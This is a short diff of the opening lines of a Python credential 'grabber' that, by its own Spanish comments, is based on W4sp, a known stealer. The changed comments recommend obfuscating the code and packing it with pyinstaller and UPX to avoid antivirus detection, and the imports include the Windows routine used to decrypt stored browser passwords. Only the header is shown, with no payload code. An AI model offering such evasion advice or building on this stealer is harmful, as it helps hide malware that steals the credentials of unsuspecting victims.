@@ -1,6 +1,6 @@
 # este grabber utiliza la base de W4sp
-# se recomienda usar un buen obfuscador y estos comandos en pyinstaller para una baja deteccion del av
-# Comandos: pyinstaller --onefile --clean --i NONE simple.py
+# se recomienda usar un buen obfuscador y estos comandos en pyinstaller incluyendo upx para una baja deteccion del av 
+# Comandos: pyinstaller --onefile --clean --i NONE simple.py 
 
 import threading,sys,os,re,ctypes
 from win32crypt import CryptUnprotectData
